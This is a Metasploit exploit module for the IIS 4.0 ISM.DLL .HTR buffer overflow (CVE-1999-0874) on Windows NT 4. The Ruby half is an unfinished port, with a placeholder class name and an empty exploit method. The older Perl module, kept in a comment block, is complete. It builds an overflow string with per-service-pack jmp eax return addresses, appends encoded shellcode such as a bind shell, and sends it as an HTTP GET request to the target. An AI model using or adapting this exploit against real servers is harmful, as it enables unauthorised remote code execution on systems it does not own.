require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'IIS 4.0 .HTR Buffer Overflow',
			'Description'    => %q{
				This exploits a buffer overflow in the ISAPI ISM.DLL used to
				process HTR scripting in IIS 4.0. This module works against
				Windows NT 4 Service Packs  3, 4, and 5. The server will
				continue to process requests until the payload being
				executed has exited. If you've set EXITFUNC to 'seh', the
				server will continue processing requests, but you will have
				trouble terminating a bind shell. If you set EXITFUNC to
				thread, the server will crash upon exit of the bind shell.
				The payload is alpha-numerically encoded without a NOP sled
				because otherwise the data gets mangled by the filters.
					
			},
			'Author'         => [ 'Stinko' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '3325'],
					[ 'BID', '307'],
					[ 'CVE', '1999-0874'],
					[ 'URL', 'http://www.eeye.com/html/research/advisories/AD19990608.html'],
					[ 'MIL', '26'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 2048,
					'BadChars' => "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x3a\x3b\x3c\x3d\x3e\x3f\x40\x5b\x5c\x5d\x5e\x5f\x60\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, winnt',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Apr 10 2002',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::iis40_htr;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'  => 'IIS 4.0 .HTR Buffer Overflow',
	'Version'  => '$Revision$',
	'Authors' => [ 'Stinko', ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'winnt' ],
	'Priv'  => 0,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 80],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Payload' =>
	  {
		'Space'  => 2048,
		'MaxNops' => 0,
		'MinNops' => 0,
		'BadChars'  =>
		  join("", map { $_=chr($_) } (0x00 .. 0x2f)).
		  join("", map { $_=chr($_) } (0x3a .. 0x40)).
		  join("", map { $_=chr($_) } (0x5b .. 0x60)).
		  join("", map { $_=chr($_) } (0x7b .. 0xff)),
	  },

	'Description'  => Pex::Text::Freeform(qq{
        This exploits a buffer overflow in the ISAPI ISM.DLL used
        to process HTR scripting in IIS 4.0. This module works against
        Windows NT 4 Service Packs  3, 4, and 5. The server will continue
        to process requests until the payload being executed has exited.
        If you've set EXITFUNC to 'seh', the server will continue processing
        requests, but you will have trouble terminating a bind shell. If you
        set EXITFUNC to thread, the server will crash upon exit of the bind
        shell. The payload is alpha-numerically encoded without a NOP sled
        because otherwise the data gets mangled by the filters.
}),

	'Refs'  =>
	  [
		['OSVDB', '3325'],
		['BID', '307'],
		['CVE', '1999-0874'],
		['URL', 'http://www.eeye.com/html/research/advisories/AD19990608.html'],
		['MIL', '26'],

	  ],

	'DefaultTarget' => 0,
	'Targets' => [
		['Windows NT4 SP3', 593, 0x77f81a4d],
		['Windows NT4 SP4', 593, 0x77f7635d],
		['Windows NT4 SP5', 589, 0x77f76385],
	  ],

	'Keys' => ['iis'],

	'DisclosureDate' => 'Apr 10 2002',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

	my $target = $self->Targets->[$target_idx];

	my $pattern = ("X" x $target->[1]);
	$pattern .= pack("V", $target->[2]);
	$pattern .= $shellcode;

	my $request = "GET /" . $pattern . ".htr HTTP/1.0\r\n\r\n";

	$self->PrintLine(sprintf ("[*] Trying ".$target->[0]." using jmp eax at 0x%.8x...", $target->[2]));

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($request);
	$s->Close();
	return;
}

1;

=end


end
end	
